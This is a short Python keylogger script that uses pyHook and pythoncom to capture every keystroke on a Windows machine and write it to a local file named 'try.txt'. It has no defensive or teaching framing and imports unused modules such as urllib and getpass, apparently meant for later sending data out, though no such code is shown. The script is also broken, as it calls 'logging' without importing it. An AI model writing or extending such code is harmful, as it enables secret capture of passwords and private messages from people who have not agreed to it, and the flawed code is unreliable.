import pyHook, pythoncom, os, urllib, getpass, shutil, sys

file_log = 'try.txt'

def OnKeyBoardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10, chr(event.Ascii))
	return True
	
hook_manager = pyHook.HookManager() # new hook manager
hook_manager.KeyDown = OnKeyBoardEvent # tells what to do when user presses button
hook_manager.HookKeyboard() # Keep hooking
pythoncom.PumpMessages() # Keeps the program running

